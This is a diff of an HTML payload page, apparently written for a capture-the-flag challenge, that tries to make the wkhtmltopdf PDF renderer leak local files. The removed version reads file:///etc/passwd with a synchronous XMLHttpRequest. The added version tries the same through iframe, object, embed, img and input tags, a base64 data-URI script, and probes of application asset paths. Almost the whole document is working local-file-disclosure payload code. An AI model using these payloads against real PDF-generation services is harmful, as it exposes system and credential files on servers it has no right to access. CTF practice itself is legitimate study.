@@ -1,46 +1,79 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>CTF File Leak (JS Only)</title>
+    <title>CTF File Leak (HTML Tag Attempts)</title>
     <style>
         body { font-family: sans-serif; margin: 20px; background-color: #282c34; color: #abb2bf; }
         h1 { color: #61afef; }
+        h2 { color: #c678dd; margin-top: 30px; }
         pre { background-color: #3e4451; padding: 15px; border: 1px solid #5c6370; white-space: pre-wrap; word-wrap: break-word; font-size: 1.1em; color: #98c379; }
-        .info-box { background-color: #3e4451; border-left: 4px solid #c678dd; padding: 10px; margin-top: 20px; color: #e06c75; }
+        .attempt-box { border: 1px solid #3e4451; padding: 15px; margin-bottom: 25px; }
+        iframe, object, embed, img { display: block; margin-top: 10px; border: 1px solid #5c6370; background-color: #f0f0f0; } /* Make them visible */
     </style>
 </head>
 <body>
-    <h1>Attempting to Leak /etc/passwd via JavaScript XMLHttpRequest:</h1>
-    <p>This page tries to read the content of /etc/passwd using the provided JavaScript code and display it below.</p>
+    <h1>Attempting to Leak /etc/passwd via HTML Tag Direct Inclusion:</h1>
+    <p>Trying various HTML tags that wkhtmltopdf might render directly from the file system.</p>
 
-    <pre id="fileContent">
-        Loading... If nothing appears here, the JavaScript might be blocked, or file access failed.
-    </pre>
-
-    <script>
-        try {
-            var x = new XMLHttpRequest();
-            // Open a synchronous GET request to the local file system
-            x.open('GET', 'file:///etc/passwd', false); // 'false' means synchronous
-            x.send(); // Send the request
-
-            // Check if the request was successful
-            // Status 200 is for HTTP, Status 0 is common for local file:/// requests in some contexts
-            if (x.status === 200 || x.status === 0) {
-                document.getElementById('fileContent').textContent = x.responseText;
-            } else {
-                // If the request fails, show the status code and text
-                document.getElementById('fileContent').textContent = 'Error fetching file: Status ' + x.status + ' - ' + x.statusText + '. This indicates a possible security restriction or file not found.';
-            }
-        } catch (e) {
-            // Catch any JavaScript errors during execution
-            document.getElementById('fileContent').textContent = 'JavaScript Execution Error: ' + e.message + '\n\n' + 'This typically means the browser (wkhtmltopdf) blocked the script or the file access for security reasons.';
-        }
-    </script>
-
-    <div class="info-box">
-        If you see "Loading..." or an error message here, it indicates that the JavaScript code ran, but the file was not accessible or the request was blocked by security policies. If the PDF is completely blank or shows an unrelated error, it means this HTML itself was not processed.
+    <div class="attempt-box">
+        <h2>1. iframe (Standard LFI attempt):</h2>
+        <pre>
+            <iframe src="file:///etc/passwd" width="800" height="400" title="/etc/passwd content"></iframe>
+        </pre>
     </div>
 
+    <div class="attempt-box">
+        <h2>2. object tag (Common alternative for embedding):</h2>
+        <pre>
+            <object data="file:///etc/passwd" type="text/plain" width="800" height="400"></object>
+        </pre>
+    </div>
+
+    <div class="attempt-box">
+        <h2>3. embed tag (Another embedding alternative):</h2>
+        <pre>
+            <embed src="file:///etc/passwd" type="text/plain" width="800" height="400">
+        </pre>
+    </div>
+
+    <div class="attempt-box">
+        <h2>4. img tag (Can sometimes render text files if not strictly validated):</h2>
+        <pre>
+            <img src="file:///etc/passwd" alt="Attempted /etc/passwd as image" width="800" height="400">
+        </pre>
+    </div>
+
+    <div class="attempt-box">
+        <h2>5. input type="image" (Less common, but worth a shot for rendering):</h2>
+        <pre>
+            <input type="image" src="file:///etc/passwd" alt="Input image attempt" width="800" height="400">
+        </pre>
+    </div>
+
+    <div class="attempt-box">
+        <h2>6. script with data URL (If script src is restrictive, sometimes data URIs bypass):</h2>
+        <p>This attempts to use a data URI. Highly unlikely to work for file:/// but worth a last-ditch try.</p>
+        <pre>
+            <script src="data:text/plain;base64,PHNjcmlwdD5kb2N1bWVudC53cml0ZSgiSGVsbG8gZnJvbSBkYXRhIFVSSSIpOzwvc2NyaXB0Pg=="></script>
+            </pre>
+    </div>
+
+    <div class="attempt-box">
+        <h2>7. Local image via relative path (Debugging/Probing)</h2>
+        <p>If there's a known image on the server, like /static/assets/favicon.png from the CTF source, try to include it. This checks if file:// is sandboxed to certain dirs.</p>
+        <pre>
+            <img src="file:///app/application/static/assets/favicon.png" alt="CTF Favicon" width="64" height="64">
+        </pre>
+        <p>Or if `file://` is interpreted as relative to the current working directory:</p>
+         <pre>
+            <img src="file:./application/static/assets/favicon.png" alt="CTF Favicon Relative" width="64" height="64">
+        </pre>
+    </div>
+
+
+    <p style="margin-top: 30px; font-size: 0.9em; color: #666;">
+        If successful, the content of /etc/passwd should appear within one of the boxes above.
+        If nothing appears, the vulnerability might require a more advanced bypass.
+    </p>
 </body>
 </html>
